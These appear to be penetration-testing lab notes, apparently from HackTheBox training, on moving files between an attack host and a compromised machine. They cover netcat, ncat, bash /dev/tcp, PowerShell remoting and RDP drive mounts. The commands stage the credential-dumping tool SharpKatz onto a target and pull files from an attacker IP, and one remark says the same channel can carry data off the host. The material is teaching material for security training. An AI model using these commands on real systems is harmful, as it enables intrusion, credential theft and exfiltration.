# File Transfer with Netcat and Ncat

## NetCat - Compromised Machine - Listening on Port 8000

```bash
  # Example using Original Netcat
  nc -l -p 8000 > SharpKatz.exe
```

## Ncat - Compromised Machine - Listening on Port 8000

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

```bash
  # Example using Ncat
  ncat -l -p 8000 --recv-only > SharpKatz.exe
```

## Netcat - Attack Host - Sending File to Compromised machine

The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

```bash
  wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
  # Example using Original Netcat
  nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## Ncat - Attack Host - Sending File to Compromised machine

The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted.

```bash
    wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
    # Example using Ncat
    ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

## Attack Host - Sending File as Input to Netcat

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios **where there's a firewall
blocking inbound connections**

```bash
  # Example using Original Netcat
  sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## Compromised Machine Connect to Netcat to Receive the File

```bash
    # Example using Original Netcat
    nc 192.168.49.128 443 > SharpKatz.exe
```

## Attack Host - Sending File as Input to Ncat

```bash
    # Example using Ncat
    sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## Compromised Machine Connect to Ncat to Receive the File

```bash
    # Example using Ncat
    ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

# /dev/TCP/

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

## NetCat - Sending File as Input to Netcat

```bash
  # Example using Original Netcat
  sudo nc -l -p 443 -q 0 < SharpKatz.exe 
```

## Ncat - Sending File as Input to Ncat

```bash
  # Example using Ncat
  sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```bash
  cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

> Note: The same operation can be used to transfer files from the compromised host to our Pwnbox.

# PowerShell Session File Transfer

There may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.

PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions.

- Enabling PowerShell remoting creates both an HTTP and an HTTPS listener.
- The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
- To create a PowerShell Remoting session on a remote computer, we will need administrative access

## From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell
PS C:\htb> whoami
# htb\administrator

PS C:\htb> hostname
# DC01

PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

# ComputerName     : DATABASE01
# RemoteAddress    : 192.168.1.101
# RemotePort       : 5985
# InterfaceAlias   : Ethernet0
# SourceAddress    : 192.168.1.100
# TcpTestSucceeded : True
```

Because this session already has privileges over **DATABASE01**, we don't need to specify credentials.
In the example below, a session is created to the remote computer named **DATABASE01** and stores the results in the variable named `$Session`.

## Create a PowerShell Remoting Session to DATABASE01

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine **DC01** to the **DATABASE01** session we have `$Session` or vice versa.

## Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

## Copy DATABASE.txt from DATABASE01 Session to our Localhost
```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

# RDP

## Mounting a Linux Folder Using rdesktop
```bash
  rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

## Mounting a Linux Folder Using xfreerdp
```bash
  xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
